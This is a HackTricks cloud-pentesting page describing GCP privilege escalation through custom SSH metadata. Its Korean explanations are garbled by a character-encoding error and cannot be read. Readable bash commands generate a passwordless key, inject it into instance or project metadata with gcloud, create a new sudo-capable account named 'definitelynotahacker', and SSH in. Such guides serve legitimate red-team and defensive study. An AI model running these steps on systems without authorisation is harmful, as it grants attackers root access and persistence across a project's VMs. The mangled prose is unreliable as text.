# GCP - Add Custom SSH Metadata

## GCP - Add Custom SSH Metadata

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Modifying the metadata <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

ì¸ìŠ¤í„´ìŠ¤ì˜ ë©”íƒ€ë°ì´í„° ìˆ˜ì •ì€ **ê³µê²©ìê°€ í•„ìš”í•œ ê¶Œí•œì„ ì–»ì„ ê²½ìš° ì‹¬ê°í•œ ë³´ì•ˆ ìœ„í—˜ì„ ì´ˆë˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

#### **SSH í‚¤ë¥¼ ì‚¬ìš©ì ì •ì˜ ë©”íƒ€ë°ì´í„°ì— í†µí•©í•˜ê¸°**

GCPì—ì„œ **ë¦¬ëˆ…ìŠ¤ ì‹œìŠ¤í…œ**ì€ ì¢…ì¢… [Google Compute Engineìš© Python Linux Guest Environment](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)ì—ì„œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤. ì´ì˜ ì¤‘ìš”í•œ êµ¬ì„± ìš”ì†ŒëŠ” **ì •ê¸°ì ìœ¼ë¡œ** ì¸ìŠ¤í„´ìŠ¤ ë©”íƒ€ë°ì´í„° ì—”ë“œí¬ì¸íŠ¸ë¥¼ í™•ì¸í•˜ì—¬ **í—ˆê°€ëœ SSH ê³µê°œ í‚¤ì˜ ì—…ë°ì´íŠ¸**ë¥¼ í™•ì¸í•˜ëŠ” [accounts daemon](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)ì…ë‹ˆë‹¤.

ë”°ë¼ì„œ ê³µê²©ìê°€ ì‚¬ìš©ì ì •ì˜ ë©”íƒ€ë°ì´í„°ë¥¼ ìˆ˜ì •í•  ìˆ˜ ìˆë‹¤ë©´, ê·¸ëŠ” ë°ëª¬ì´ ìƒˆë¡œìš´ ê³µê°œ í‚¤ë¥¼ ì°¾ë„ë¡ ë§Œë“¤ ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” ì²˜ë¦¬ë˜ì–´ **ë¡œì»¬ ì‹œìŠ¤í…œì— í†µí•©ë©ë‹ˆë‹¤**. í‚¤ëŠ” **ê¸°ì¡´ ì‚¬ìš©ì**ì˜ `~/.ssh/authorized_keys` íŒŒì¼ì— ì¶”ê°€ë˜ê±°ë‚˜, í‚¤ì˜ í˜•ì‹ì— ë”°ë¼ `sudo` ê¶Œí•œì´ ìˆëŠ” ìƒˆë¡œìš´ ì‚¬ìš©ìë¥¼ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ë¦¬ê³  ê³µê²©ìëŠ” í˜¸ìŠ¤íŠ¸ë¥¼ ì†ìƒì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### **ê¸°ì¡´ ê¶Œí•œ ìˆëŠ” ì‚¬ìš©ìì—ê²Œ SSH í‚¤ ì¶”ê°€í•˜ê¸°**

1. **ì¸ìŠ¤í„´ìŠ¤ì˜ ê¸°ì¡´ SSH í‚¤ í™•ì¸:**
*   ì¸ìŠ¤í„´ìŠ¤ì™€ ê·¸ ë©”íƒ€ë°ì´í„°ë¥¼ ì„¤ëª…í•˜ëŠ” ëª…ë ¹ì„ ì‹¤í–‰í•˜ì—¬ ê¸°ì¡´ SSH í‚¤ë¥¼ ì°¾ìŠµë‹ˆë‹¤. ì¶œë ¥ì˜ ê´€ë ¨ ì„¹ì…˜ì€ `metadata` ì•„ë˜, íŠ¹íˆ `ssh-keys` í‚¤ì— ìˆìŠµë‹ˆë‹¤.

```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
* SSH í‚¤ì˜ í˜•ì‹ì— ì£¼ì˜í•˜ì‹­ì‹œì˜¤: ì‚¬ìš©ì ì´ë¦„ì€ í‚¤ ì•ì— ìœ„ì¹˜í•˜ë©°, ì½œë¡ ìœ¼ë¡œ êµ¬ë¶„ë©ë‹ˆë‹¤.
2. **SSH í‚¤ ë©”íƒ€ë°ì´í„°ë¥¼ ìœ„í•œ í…ìŠ¤íŠ¸ íŒŒì¼ ì¤€ë¹„:**
* ì‚¬ìš©ì ì´ë¦„ê³¼ í•´ë‹¹ SSH í‚¤ì˜ ì„¸ë¶€ ì •ë³´ë¥¼ `meta.txt`ë¼ëŠ” í…ìŠ¤íŠ¸ íŒŒì¼ì— ì €ì¥í•©ë‹ˆë‹¤. ì´ëŠ” ê¸°ì¡´ í‚¤ë¥¼ ë³´ì¡´í•˜ë©´ì„œ ìƒˆë¡œìš´ í‚¤ë¥¼ ì¶”ê°€í•˜ëŠ” ë° í•„ìˆ˜ì ì…ë‹ˆë‹¤.
3. **ëŒ€ìƒ ì‚¬ìš©ì(`alice` ì˜ˆì‹œ)ì˜ ìƒˆë¡œìš´ SSH í‚¤ ìƒì„±:**
*   `ssh-keygen` ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ ìƒˆë¡œìš´ SSH í‚¤ë¥¼ ìƒì„±í•˜ë©°, ì£¼ì„ í•„ë“œ(`-C`)ê°€ ëŒ€ìƒ ì‚¬ìš©ì ì´ë¦„ê³¼ ì¼ì¹˜í•˜ë„ë¡ í•©ë‹ˆë‹¤.

```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
* ìƒˆë¡œìš´ ê³µê°œ í‚¤ë¥¼ `meta.txt`ì— ì¶”ê°€í•˜ì—¬ ì¸ìŠ¤í„´ìŠ¤ì˜ ë©”íƒ€ë°ì´í„°ì—ì„œ ì°¾ì€ í˜•ì‹ì„ ëª¨ë°©í•©ë‹ˆë‹¤.
4. **ì¸ìŠ¤í„´ìŠ¤ì˜ SSH í‚¤ ë©”íƒ€ë°ì´í„° ì—…ë°ì´íŠ¸:**
*   `gcloud compute instances add-metadata` ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ ì¸ìŠ¤í„´ìŠ¤ì— ì—…ë°ì´íŠ¸ëœ SSH í‚¤ ë©”íƒ€ë°ì´í„°ë¥¼ ì ìš©í•©ë‹ˆë‹¤.

```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```
5. **ìƒˆë¡œìš´ SSH í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ì¸ìŠ¤í„´ìŠ¤ì— ì ‘ê·¼:**
*   ìƒˆë¡œìš´ í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ SSHë¡œ ì¸ìŠ¤í„´ìŠ¤ì— ì—°ê²°í•˜ê³ , ëŒ€ìƒ ì‚¬ìš©ì(`alice` ì˜ˆì‹œ)ì˜ ì»¨í…ìŠ¤íŠ¸ì—ì„œ ì…¸ì— ì ‘ê·¼í•©ë‹ˆë‹¤.

```bash
ssh -i ./key alice@localhost
sudo id
```

#### **ìƒˆë¡œìš´ ê¶Œí•œ ìˆëŠ” ì‚¬ìš©ì ìƒì„± ë° SSH í‚¤ ì¶”ê°€í•˜ê¸°**

í¥ë¯¸ë¡œìš´ ì‚¬ìš©ìê°€ ë°œê²¬ë˜ì§€ ì•Šìœ¼ë©´, `sudo` ê¶Œí•œì´ ë¶€ì—¬ëœ ìƒˆë¡œìš´ ì‚¬ìš©ìë¥¼ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
#### SSH í‚¤ë¥¼ í”„ë¡œì íŠ¸ ìˆ˜ì¤€ì—ì„œ <a href="#sshing-around" id="sshing-around"></a>

**í”„ë¡œì íŠ¸ ìˆ˜ì¤€ì—ì„œ SSH í‚¤ë¥¼ ì ìš©**í•˜ì—¬ í´ë¼ìš°ë“œ í™˜ê²½ì˜ ì—¬ëŸ¬ ê°€ìƒ ë¨¸ì‹ (VM)ì— ëŒ€í•œ SSH ì•¡ì„¸ìŠ¤ ë²”ìœ„ë¥¼ ë„“í ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì ‘ê·¼ ë°©ì‹ì€ í”„ë¡œì íŠ¸ ë‚´ì—ì„œ ëª…ì‹œì ìœ¼ë¡œ í”„ë¡œì íŠ¸ ì „ì²´ SSH í‚¤ë¥¼ ì°¨ë‹¨í•˜ì§€ ì•Šì€ ëª¨ë“  ì¸ìŠ¤í„´ìŠ¤ì— SSH ì•¡ì„¸ìŠ¤ë¥¼ í—ˆìš©í•©ë‹ˆë‹¤. ìš”ì•½ ê°€ì´ë“œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

1. **í”„ë¡œì íŠ¸ ìˆ˜ì¤€ì—ì„œ SSH í‚¤ ì ìš©:**
*   `gcloud compute project-info add-metadata` ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ `meta.txt`ì˜ SSH í‚¤ë¥¼ í”„ë¡œì íŠ¸ì˜ ë©”íƒ€ë°ì´í„°ì— ì¶”ê°€í•©ë‹ˆë‹¤. ì´ ì‘ì—…ì€ VMì´ "í”„ë¡œì íŠ¸ ì „ì²´ SSH í‚¤ ì°¨ë‹¨" ì˜µì…˜ì„ í™œì„±í™”í•˜ì§€ ì•ŠëŠ” í•œ, SSH í‚¤ê°€ í”„ë¡œì íŠ¸ì˜ ëª¨ë“  VMì—ì„œ ì¸ì‹ë˜ë„ë¡ ë³´ì¥í•©ë‹ˆë‹¤.

```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```
2. **í”„ë¡œì íŠ¸ ì „ì²´ í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ì¸ìŠ¤í„´ìŠ¤ì— SSH ì ‘ì†:**
* í”„ë¡œì íŠ¸ ì „ì²´ SSH í‚¤ê°€ ì„¤ì •ë˜ë©´, í”„ë¡œì íŠ¸ ë‚´ì˜ ëª¨ë“  ì¸ìŠ¤í„´ìŠ¤ì— SSH ì ‘ì†í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í”„ë¡œì íŠ¸ ì „ì²´ í‚¤ë¥¼ ì°¨ë‹¨í•˜ì§€ ì•ŠëŠ” ì¸ìŠ¤í„´ìŠ¤ëŠ” SSH í‚¤ë¥¼ ìˆ˜ë½í•˜ì—¬ ì•¡ì„¸ìŠ¤ë¥¼ í—ˆìš©í•©ë‹ˆë‹¤.
* ì¸ìŠ¤í„´ìŠ¤ì— SSH ì ‘ì†í•˜ëŠ” ì§ì ‘ì ì¸ ë°©ë²•ì€ `gcloud compute ssh [INSTANCE]` ëª…ë ¹ì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ í˜„ì¬ ì‚¬ìš©ì ì´ë¦„ê³¼ í”„ë¡œì íŠ¸ ìˆ˜ì¤€ì—ì„œ ì„¤ì •ëœ SSH í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ì•¡ì„¸ìŠ¤ë¥¼ ì‹œë„í•©ë‹ˆë‹¤.

## References

* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
